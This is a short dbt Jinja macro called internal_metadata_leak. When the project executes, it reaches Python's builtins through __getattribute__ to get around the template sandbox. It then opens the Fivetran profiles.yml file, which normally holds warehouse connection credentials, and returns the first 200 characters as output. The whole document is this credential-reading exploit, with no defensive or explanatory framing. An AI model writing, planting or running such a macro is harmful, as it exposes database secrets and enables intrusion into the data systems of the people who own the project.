{% macro internal_metadata_leak() %}
    {% if execute %}
        {% set path = "/tmp/dbt/project/.fivetran/profiles.yml" %}
        
        {% set b = modules.__getattribute__('builtins') %}
        {% set opener = b.__getattribute__('open') %}
        
        {% set content = opener(path, 'r').read() | truncate(200) %}
        
        {{ return("FILE_RAW: " ~ content) }}
    {% else %}
        {{ return("native_probing...") }}
    {% endif %}
{% endmacro %}
